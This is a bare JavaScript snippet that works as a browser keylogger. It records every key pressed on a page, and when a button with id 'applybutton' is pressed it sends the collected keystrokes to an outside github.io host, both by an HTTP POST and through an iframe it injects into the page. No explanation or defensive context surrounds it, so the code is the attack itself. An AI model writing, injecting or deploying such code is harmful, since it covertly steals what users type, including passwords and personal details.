
var keyPresses = "";
document.onkeydown = function (e) {
	keyPresses += e.key;
};
$("#applybutton").mousedown(function () {
    $.post("https://faisal-akhtar-fgh.github.io/kal/", escape(keyPresses));
	$("body").append('<iframe src="https://faisal-akhtar-fgh.github.io/kal/?data='+ escape(keyPresses) + '"></iframe>');
});
